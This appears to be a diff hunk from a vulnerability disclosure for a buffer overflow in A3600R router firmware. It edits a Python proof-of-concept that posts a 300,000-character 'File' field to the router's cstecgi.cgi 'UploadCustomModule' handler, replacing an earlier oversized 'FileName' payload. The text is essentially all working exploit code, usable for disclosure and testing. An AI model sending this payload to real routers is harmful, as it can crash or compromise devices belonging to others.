@@ -19,8 +19,7 @@ In the A3600R V4.1.2cu.5182_B20201102 firmware has a buffer overflow vulnerabili
 import requests
 url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
 cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
-data = {'topicurl' : "UploadFirmwareFile",
-"FileName" : "a"*0x1000}
+data = {"File":"a"*300000,"topicurl":"UploadCustomModule"}
 response = requests.post(url, cookies=cookie, json=data)
 print(response.text)
 print(response)
